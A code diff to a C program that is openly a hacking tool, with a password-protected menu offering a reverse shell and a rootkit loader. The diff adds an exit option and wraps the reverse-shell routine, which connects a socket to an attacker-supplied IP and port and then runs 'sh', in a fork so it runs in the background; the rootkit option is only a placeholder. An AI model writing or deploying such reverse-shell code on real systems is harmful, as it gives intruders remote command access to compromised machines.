@@ -44,6 +44,7 @@ if(strcmp(password, pass) == 0){
 
 	printf("1) REVERSE SHELL \n");
 	printf("2) LOADING FULL ROOTKIT \n");
+	printf("3  EXIT \n");
 	printf("=> ");
 	scanf("%i", &escolha);
 
@@ -61,6 +62,11 @@ case 1:
 	printf("[+] SET YOUR LPORT => ");
 	scanf("%i", &port);
 
+	printf("[+] RECEVED REVERSE SHELL => %s:%i \n", ip, port);
+
+if(fork() == 0){
+
+
     struct sockaddr_in revsockaddr;
 
     int sockt = socket(AF_INET, SOCK_STREAM, 0);
@@ -76,11 +82,18 @@ case 1:
 
     char * const argv[] = {"sh", NULL};
     execvp("sh", argv);
+
+}
 	break;
 
 case 2:
 
 	printf("test \n");
+	break;
+
+case 3:
+
+	return 0;
 	break;
 
 default:
